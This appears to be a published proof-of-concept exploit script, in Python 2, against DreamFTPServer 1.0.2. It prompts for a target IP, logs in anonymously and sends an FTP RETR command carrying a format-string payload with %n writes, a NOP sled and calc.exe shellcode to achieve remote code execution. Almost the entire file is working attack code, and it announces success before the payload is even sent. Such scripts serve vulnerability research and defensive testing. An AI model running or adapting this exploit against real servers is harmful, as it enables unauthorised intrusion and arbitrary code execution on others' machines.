import socket
import os
import sys

print '''

                ##############################################
                #    Created: ScrR1pTK1dd13                  #
                #    Name: Greg Priest                       #
                #    Mail: ScrR1pTK1dd13.slammer@gmail.com   # 
                ##############################################

# Exploit Title: DreamFTPServer1.0.2_RETR_command_format_string_remotecodevuln
# Date: 2016.11.04
# Exploit Author: Greg Priest
# Version: DreamFTPServer1.0.2
# Tested on: Windows7 x64 HUN/ENG Professional
'''

ip = raw_input("Target ip: ")
port = 21
overflow = '%8x%8x%8x%8x%8x%8x%8x%8x%341901071x%n%8x%8x%24954x%n%x%x%x%n'
nop = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
#overflow = '%8x%8x%8x%8x%8x%8x%8x%8x%341901090x%n%8x%8x%24954x%n%x%x%x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'

#shellcode calc.exe
shellcode =(
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
"\x45\x81\x3e\x43\x72\x65\x61\x75" +
"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
"\x53\x53\x53\x53\x52\x53\xff\xd7")

remotecode = overflow + nop + shellcode + '\r\n'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((ip ,port))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASSW hacker@hacker.net\r\n')
s.recv(1024)
print remotecode
print '''
Successfull Exploitation!
'''
message = 'RETR ' + remotecode 
s.send(message)
s.recv(1024)
s.close